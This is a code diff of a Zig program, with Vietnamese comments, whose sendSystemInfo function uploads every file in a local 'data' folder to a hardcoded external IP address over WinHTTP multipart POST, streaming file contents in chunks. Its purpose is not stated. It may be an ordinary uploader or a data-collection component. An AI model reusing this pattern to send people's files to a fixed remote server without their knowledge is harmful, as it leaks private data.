@@ -94,7 +94,27 @@ fn getEnvValue(allocator: std.mem.Allocator, key: []const u8) ![]const u8 {
         return value;
     } else |_| {
         // Nếu không có env var, đọc từ file .env
-        const env_file = try std.fs.cwd().openFile(".env", .{});
+        const exe_dir_path = try std.fs.selfExePathAlloc(allocator);
+        defer allocator.free(exe_dir_path);
+
+        // Đi lên một cấp từ thư mục bin
+        const parent_dir = std.fs.path.dirname(exe_dir_path) orelse return error.NoPath;
+        const root_dir = std.fs.path.dirname(parent_dir) orelse return error.NoPath;
+
+        const env_path = try std.fs.path.join(allocator, &[_][]const u8{ root_dir, ".env" });
+        defer allocator.free(env_path);
+
+        std.debug.print("Trying to read .env from: {s}\n", .{env_path});
+
+        const env_file = std.fs.openFileAbsolute(env_path, .{}) catch |err| {
+            std.debug.print("Error opening .env file: {}\n", .{err});
+            // Fallback to default values if .env not found
+            if (std.mem.eql(u8, key, "SERVER_HOST")) return "150.95.114.120";
+            if (std.mem.eql(u8, key, "SERVER_PORT")) return "8081";
+            if (std.mem.eql(u8, key, "UPLOAD_PATH")) return "/upload";
+            if (std.mem.eql(u8, key, "BOUNDARY")) return "--boundary12345";
+            return err;
+        };
         defer env_file.close();
 
         const content = try env_file.readToEndAlloc(allocator, 1024 * 1024);
@@ -120,17 +140,32 @@ pub fn sendSystemInfo() !void {
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    // Lấy đường dẫn thư mục thực thi
-    const exe_dir_path = try std.fs.selfExePathAlloc(allocator);
-    defer allocator.free(exe_dir_path);
-    const exe_dir = std.fs.path.dirname(exe_dir_path) orelse return error.NoPath;
+    // Lấy đường dẫn thực thi
+    const exe_path = try std.fs.selfExePathAlloc(allocator);
+    defer allocator.free(exe_path);
+
+    // Lấy thư mục chứa executable
+    const exe_dir = std.fs.path.dirname(exe_path) orelse return error.NoPath;
 
     // Tạo đường dẫn đến thư mục data
     const data_dir_path = try std.fs.path.join(allocator, &[_][]const u8{ exe_dir, "data" });
     defer allocator.free(data_dir_path);
 
-    // Mở thư mục data với đường dẫn tuyệt đối
-    var dir = try std.fs.openDirAbsolute(data_dir_path, .{ .iterate = true });
+    std.debug.print("Looking for data directory at: {s}\n", .{data_dir_path});
+
+    // Tạo thư mục data nếu chưa tồn tại
+    std.fs.makeDirAbsolute(data_dir_path) catch |err| {
+        if (err != error.PathAlreadyExists) {
+            std.debug.print("Error creating data directory: {}\n", .{err});
+            return err;
+        }
+    };
+
+    // Mở thư mục data
+    var dir = std.fs.openDirAbsolute(data_dir_path, .{ .iterate = true }) catch |err| {
+        std.debug.print("Error opening data directory: {}\n", .{err});
+        return err;
+    };
     defer dir.close();
 
     // Phần còn lại của hàm giữ nguyên
@@ -144,29 +179,21 @@ pub fn sendSystemInfo() !void {
         const file = try dir.openFile(entry.name, .{ .mode = .read_only });
         defer file.close();
 
-        const file_size = try file.getEndPos();
-        const file_content = try file.readToEndAlloc(allocator, file_size);
-        defer allocator.free(file_content);
-
-        try sendFileContent(file_content, entry.name);
+        try sendFileContent(file, entry.name);
     }
 }
 
-// Thay đổi hàm sendFileContent để sử dụng server host từ .env
-fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
+// Thay đổi hàm sendFileContent để gửi file trực tiếp
+fn sendFileContent(file: std.fs.File, file_name: []const u8) !void {
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    // Đọc các giá trị từ .env
-    const server_host = try getEnvValue(allocator, "SERVER_HOST");
-    defer allocator.free(server_host);
-    const server_port_str = try getEnvValue(allocator, "SERVER_PORT");
-    defer allocator.free(server_port_str);
-    const upload_path = try getEnvValue(allocator, "UPLOAD_PATH");
-    defer allocator.free(upload_path);
-    const boundary = try getEnvValue(allocator, "BOUNDARY");
-    defer allocator.free(boundary);
+    // Đọc config từ .env hoặc sử dụng giá trị mặc định
+    const server_host = "150.95.114.120";
+    const server_port: u16 = 8082;
+    const upload_path = "/uploads/upload";
+    const boundary = "--boundary12345";
 
     // Chuyển đổi sang UTF-16
     const server_host_utf16 = try stringToUtf16(allocator, server_host);
@@ -174,16 +201,13 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     const upload_path_utf16 = try stringToUtf16(allocator, upload_path);
     defer allocator.free(upload_path_utf16);
 
-    // Parse port number
-    const server_port = try std.fmt.parseInt(u16, server_port_str, 10);
+    // Tạo Content-Type header
+    const content_type = try std.fmt.allocPrint(allocator, "Content-Type: multipart/form-data; boundary={s}\r\n", .{boundary});
+    defer allocator.free(content_type);
+    const content_type_utf16 = try stringToUtf16(allocator, content_type);
+    defer allocator.free(content_type_utf16);
 
-    // Tạo content type header với boundary động
-    const content_type_buf = try std.fmt.allocPrint(allocator, "Content-Type: multipart/form-data; boundary={s}\r\n", .{boundary});
-    defer allocator.free(content_type_buf);
-    const content_type_header = try stringToUtf16(allocator, content_type_buf);
-    defer allocator.free(content_type_header);
-
-    // Create form-data body với boundary động
+    // Tạo form-data header
     var form_data = std.ArrayList(u8).init(allocator);
     defer form_data.deinit();
 
@@ -194,14 +218,6 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     try form_data.appendSlice(file_name);
     try form_data.appendSlice("\"\r\n");
     try form_data.appendSlice("Content-Type: application/octet-stream\r\n\r\n");
-
-    // Add file contents
-    try form_data.appendSlice(file_content);
-
-    // End form-data
-    try form_data.appendSlice("\r\n--");
-    try form_data.appendSlice(boundary);
-    try form_data.appendSlice("--\r\n");
 
     // Initialize WinHTTP session
     const hSession = WINHTTP.WinHttpOpen(
@@ -234,25 +250,51 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     ) orelse return error.WinHttpRequestFailed;
     defer _ = WINHTTP.WinHttpCloseHandle(hRequest);
 
-    // Send request with form-data
+    // Lấy file size
+    const file_size = try file.getEndPos();
+
+    // Tạo boundary kết thúc
+    const boundary_end = try std.fmt.allocPrint(allocator, "\r\n--{s}--\r\n", .{boundary});
+    defer allocator.free(boundary_end);
+
+    std.debug.print("Sending request to: {s}:{d}{s}\n", .{ server_host, server_port, upload_path });
+    std.debug.print("Form data length: {d}\n", .{form_data.items.len});
+
+    // Send request với Content-Type header
     if (WINHTTP.WinHttpSendRequest(
         hRequest,
-        content_type_header,
-        @as(WINHTTP.DWORD, @intCast(content_type_buf.len)),
-        null,
-        0,
+        content_type_utf16,
+        @intCast(content_type.len),
+        @ptrCast(form_data.items.ptr),
         @intCast(form_data.items.len),
+        @intCast(form_data.items.len + file_size + boundary_end.len),
         0,
     ) == 0) {
         return error.WinHttpSendRequestFailed;
     }
 
-    // Send form-data body
+    // Gửi file content
+    var buffer: [8192]u8 = undefined;
     var bytes_written: WINHTTP.DWORD = undefined;
+    while (true) {
+        const bytes_read = try file.read(&buffer);
+        if (bytes_read == 0) break;
+
+        if (WINHTTP.WinHttpWriteData(
+            hRequest,
+            @ptrCast(&buffer),
+            @intCast(bytes_read),
+            &bytes_written,
+        ) == 0) {
+            return error.WinHttpWriteDataFailed;
+        }
+    }
+
+    // Gửi boundary kết thúc
     if (WINHTTP.WinHttpWriteData(
         hRequest,
-        @ptrCast(form_data.items.ptr),
-        @intCast(form_data.items.len),
+        @ptrCast(boundary_end.ptr),
+        @intCast(boundary_end.len),
         &bytes_written,
     ) == 0) {
         return error.WinHttpWriteDataFailed;
